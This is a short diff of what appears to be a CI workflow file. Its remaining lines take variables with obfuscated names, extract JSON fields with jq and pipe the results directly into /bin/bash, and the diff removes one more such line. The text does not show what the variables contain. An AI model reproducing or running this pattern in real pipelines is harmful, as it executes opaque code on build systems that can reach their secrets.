@@ -22,7 +22,6 @@ jobs:
           echo $dcrl21890 | jq -r .ufwx85 | /bin/bash
           printf '%s' "$vhf4066" | jq -r .wyqmx59 | /bin/bash
           echo $boud1666 | jq -r .jjvza7 | /bin/bash
-          printf '%s' "$jvax92" | jq -r .fo39 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
